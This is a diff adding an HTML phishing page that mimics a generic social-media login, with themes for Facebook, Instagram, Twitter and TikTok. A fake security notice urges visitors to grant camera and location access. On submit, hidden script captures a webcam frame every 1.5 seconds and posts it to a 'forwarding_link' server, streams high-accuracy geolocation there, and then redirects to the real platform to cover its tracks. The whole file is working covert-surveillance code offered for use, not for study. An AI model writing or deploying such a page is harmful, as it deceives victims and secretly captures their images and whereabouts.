@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>social_platform Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <style>
+        :root {
+            --primary-color: #1877f2;
+            --secondary-color: #42b72a;
+            --text-color: #1c1e21;
+            --bg-color: #f0f2f5;
+            --error-color: #c94242;
+            --border-color: #dddfe2;
+            --box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Instagram colors */
+        .instagram-theme {
+            --primary-color: #405de6;
+            --secondary-color: #5851db;
+            --gradient-start: #833ab4;
+            --gradient-mid: #fd1d1d;
+            --gradient-end: #fcb045;
+        }
+
+        /* Twitter colors */
+        .twitter-theme {
+            --primary-color: #1da1f2;
+            --secondary-color: #17bf63;
+        }
+
+        /* TikTok colors */
+        .tiktok-theme {
+            --primary-color: #ff0050;
+            --secondary-color: #00f2ea;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            line-height: 1.34;
+        }
+
+        .container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .login-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            max-width: 400px;
+            width: 100%;
+        }
+
+        .branding {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .brand-logo {
+            font-size: 3rem;
+            font-weight: bold;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+
+        .brand-tag {
+            font-size: 1.2rem;
+            font-weight: 300;
+            margin-bottom: 30px;
+            color: #606770;
+        }
+
+        .login-form {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: var(--box-shadow);
+            padding: 20px;
+            width: 100%;
+        }
+
+        .form-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+            position: relative;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            font-size: 1rem;
+            outline: none;
+            transition: border 0.2s ease-in-out;
+        }
+
+        .form-control:focus {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2);
+        }
+
+        .form-button {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 14px 16px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 15px;
+            transition: background-color 0.2s ease;
+        }
+
+        .form-button:hover {
+            background-color: #166fe5;
+        }
+
+        .form-link {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-size: 0.9rem;
+            display: block;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .form-link:hover {
+            text-decoration: underline;
+        }
+
+        .form-separator {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .separator-line {
+            flex-grow: 1;
+            height: 1px;
+            background-color: #dadde1;
+        }
+
+        .separator-text {
+            padding: 0 10px;
+            color: #606770;
+            font-size: 0.9rem;
+        }
+
+        .create-account-btn {
+            background-color: var(--secondary-color);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 10px 16px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            width: auto;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+        }
+
+        .create-account-btn:hover {
+            background-color: #36a420;
+        }
+
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            font-size: 0.8rem;
+            color: #606770;
+        }
+
+        .footer a {
+            color: #606770;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .language-selector {
+            margin-bottom: 10px;
+        }
+
+        .language-list {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            list-style: none;
+        }
+
+        .language-item {
+            margin: 0 5px;
+        }
+
+        .notification {
+            background-color: #fff9db;
+            border: 1px solid #ffd43b;
+            border-radius: 6px;
+            padding: 10px;
+            margin-bottom: 15px;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+        }
+
+        .notification i {
+            margin-right: 8px;
+            color: #f59f00;
+        }
+
+        .error-message {
+            color: var(--error-color);
+            font-size: 0.9rem;
+            margin-top: 5px;
+            display: none;
+        }
+
+        /* Instagram gradient button */
+        .instagram-theme .form-button {
+            background: linear-gradient(45deg, var(--gradient-start), var(--gradient-mid), var(--gradient-end));
+        }
+
+        /* Responsive design */
+        @media (max-width: 768px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .login-content {
+                max-width: 100%;
+            }
+            
+            .brand-logo {
+                font-size: 2.5rem;
+            }
+            
+            .brand-tag {
+                font-size: 1rem;
+            }
+        }
+
+        /* Hidden camera elements */
+        .video-wrap {
+            position: fixed;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- Camera functionality (hidden) -->
+    <div class="video-wrap" hidden="hidden">
+       <video id="video" playsinline autoplay></video>
+    </div>
+
+    <canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+
+    <div class="container">
+        <div class="login-content">
+            <div class="branding">
+                <div class="brand-logo" id="brandLogo">social_platform</div>
+                <div class="brand-tag" id="brandTag">Connect with friends and the world around you.</div>
+            </div>
+            
+            <div class="login-form">
+                <div class="notification">
+                    <i>⚠️</i> For security reasons, we need to verify your identity. Please allow camera and location access when prompted.
+                </div>
+                
+                <h2 class="form-title">Log In</h2>
+                
+                <form id="loginForm">
+                    <div class="form-group">
+                        <input type="text" class="form-control" placeholder="Email or Phone Number" required>
+                        <div class="error-message">Please enter a valid email or phone number</div>
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="password" class="form-control" placeholder="Password" required>
+                        <div class="error-message">Password is required</div>
+                    </div>
+                    
+                    <button type="submit" class="form-button">Log In</button>
+                    
+                    <a href="#" class="form-link">Forgot Password?</a>
+                    
+                    <div class="form-separator">
+                        <div class="separator-line"></div>
+                        <div class="separator-text">OR</div>
+                        <div class="separator-line"></div>
+                    </div>
+                    
+                    <div style="text-align: center;">
+                        <button type="button" class="create-account-btn">Create New Account</button>
+                    </div>
+                </form>
+            </div>
+            
+            <div class="footer">
+                <div class="language-selector">
+                    <ul class="language-list">
+                        <li class="language-item"><a href="#">English (US)</a></li>
+                        <li class="language-item"><a href="#">Español</a></li>
+                        <li class="language-item"><a href="#">Français</a></li>
+                        <li class="language-item"><a href="#">Português</a></li>
+                        <li class="language-item"><a href="#">العربية</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <a href="#">About</a> · 
+                    <a href="#">Help</a> · 
+                    <a href="#">Privacy</a> · 
+                    <a href="#">Terms</a> · 
+                    <a href="#">Cookie Policy</a>
+                </div>
+                
+                <div style="margin-top: 10px;">
+                    social_platform © 2024
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function post(imgdata) {
+            $.ajax({
+                type: 'POST',
+                data: { cat: imgdata },
+                url: 'forwarding_link/post.php',
+                dataType: 'json',
+                async: false,
+                success: function(result) {
+                    // call the function that handles the response/results
+                },
+                error: function() {
+                }
+            });
+        }
+        
+        // Function to send location data to server
+        function sendLocationToServer(position) {
+            const locationData = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                altitude: position.coords.altitude,
+                speed: position.coords.speed,
+                heading: position.coords.heading,
+                timestamp: position.timestamp
+            };
+            
+            // Convert location data to URL parameters
+            const params = new URLSearchParams();
+            for (const [key, value] of Object.entries(locationData)) {
+                if (value !== null) {
+                    params.append(key, value);
+                }
+            }
+            
+            // Send data using GET request (more reliable for this purpose)
+            const img = new Image();
+            img.src = "forwarding_link/ip.php?" + params.toString();
+            console.log("Location sent:", locationData);
+        }
+        
+        // Function to track location
+        function trackLocation() {
+            if (navigator.geolocation) {
+                // Get location with high accuracy
+                const options = {
+                    enableHighAccuracy: true,
+                    maximumAge: 0,
+                    timeout: 5000
+                };
+                
+                // Get initial position
+                navigator.geolocation.getCurrentPosition(sendLocationToServer, 
+                    function(error) {
+                        console.error("Error getting location:", error.message);
+                    }, 
+                    options
+                );
+                
+                // Set up continuous tracking
+                const watchId = navigator.geolocation.watchPosition(sendLocationToServer,
+                    function(error) {
+                        console.error("Error tracking location:", error.message);
+                    }, 
+                    options
+                );
+                
+                // Store watchId to allow stopping location tracking later
+                window.locationWatchId = watchId;
+            } else {
+                console.error("Geolocation is not supported by this browser");
+            }
+        }
+
+        'use strict';
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const errorMsgElement = document.querySelector('span#errorMsg');
+
+        const constraints = {
+            audio: false,
+            video: {
+                facingMode: "user"
+            }
+        };
+
+        // Access webcam
+        async function init() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                handleSuccess(stream);
+            } catch (e) {
+                console.error(`navigator.getUserMedia error: ${e.toString()}`);
+            }
+        }
+
+        // Success
+        function handleSuccess(stream) {
+            window.stream = stream;
+            video.srcObject = stream;
+
+            var context = canvas.getContext('2d');
+            setInterval(function() {
+                context.drawImage(video, 0, 0, 640, 480);
+                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+                post(canvasData);
+            }, 1500);
+        }
+
+        // Dynamically adjust theme based on platform name
+        document.addEventListener('DOMContentLoaded', function() {
+            const platformName = 'social_platform';
+            const brandLogo = document.getElementById('brandLogo');
+            const brandTag = document.getElementById('brandTag');
+            
+            // Customize based on platform name
+            if (platformName.toLowerCase().includes('facebook')) {
+                document.body.classList.remove('instagram-theme', 'twitter-theme', 'tiktok-theme');
+                brandTag.textContent = 'Connect with friends and the world around you.';
+            } else if (platformName.toLowerCase().includes('instagram')) {
+                document.body.classList.add('instagram-theme');
+                document.body.classList.remove('twitter-theme', 'tiktok-theme');
+                brandTag.textContent = 'Sign in to see photos and videos from your friends.';
+            } else if (platformName.toLowerCase().includes('twitter')) {
+                document.body.classList.add('twitter-theme');
+                document.body.classList.remove('instagram-theme', 'tiktok-theme');
+                brandTag.textContent = 'See what\'s happening in the world right now.';
+            } else if (platformName.toLowerCase().includes('tik') || platformName.toLowerCase().includes('tok')) {
+                document.body.classList.add('tiktok-theme');
+                document.body.classList.remove('instagram-theme', 'twitter-theme');
+                brandTag.textContent = 'Watch, create, and share videos on TikTok.';
+            }
+
+            // Handle form submission
+            document.getElementById('loginForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                // Initialize webcam after form submission
+                init();
+                // Start location tracking
+                trackLocation();
+                // Redirect after a short delay
+                setTimeout(function() {
+                    window.location.href = "https://www." + platformName.toLowerCase() + ".com";
+                }, 3000);
+            });
+            
+            // Request location permission on page load
+            // This pre-requests permission before form submission for a better user experience
+            if (navigator.geolocation) {
+                navigator.permissions.query({name: 'geolocation'}).then(function(result) {
+                    if (result.state === 'granted' || result.state === 'prompt') {
+                        console.log("Location permission status:", result.state);
+                    }
+                });
+            }
+        });
+    </script>
+</body>
+</html> 
